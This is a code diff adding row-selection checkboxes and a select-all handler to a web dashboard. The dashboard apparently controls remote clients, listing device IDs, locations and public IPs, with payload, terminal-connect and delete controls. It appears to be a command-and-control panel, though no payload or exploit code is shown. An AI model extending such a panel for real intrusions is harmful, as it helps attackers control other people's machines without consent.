@@ -163,6 +163,17 @@
         .payload-container button:hover {
             background-color: #666;
         }
+        .selector-container {
+            margin-left: 20px;
+        }
+        .selector-container label {
+            display: block;
+            margin-bottom: 10px;
+            color: #fff;
+        }
+        .selector-container input[type="checkbox"] {
+            margin-right: 10px;
+        }
     </style>
 </head>
 <body>
@@ -206,6 +217,7 @@
     <table>
         <thead>
             <tr>
+                <th>Select</th>
                 <th>Device ID</th>
                 <th>Location</th>
                 <th>Status</th>
@@ -277,6 +289,7 @@
                     <td>${clientData.public_ip}</td>
                     <td><img src='https://upload.wikimedia.org/wikipedia/commons/6/6f/Octicons-terminal.svg' id='connect' alt="Connect icon" class='terminal-icon' data-row-id="${clientId}"></td>
                     <td><img src='https://upload.wikimedia.org/wikipedia/commons/9/9c/Trash-can_-_Delapouite_-_game-icons.svg' class='trashcan-icon' alt='Delete icon' id='delete' data-row-id="${clientId}"></td>
+                    <td><input type="checkbox" class="row-select" data-row-id="${clientId}"></td>
                 `;
                 tableBody.appendChild(row);
             });
@@ -335,6 +348,13 @@
                 console.error('Error sending delete request:', error);
             });
         }
+    });
+
+    document.getElementById('select-all').addEventListener('change', function() {
+        const isChecked = this.checked;
+        document.querySelectorAll('.row-select').forEach(checkbox => {
+            checkbox.checked = isChecked;
+        });
     });
 
 </script>
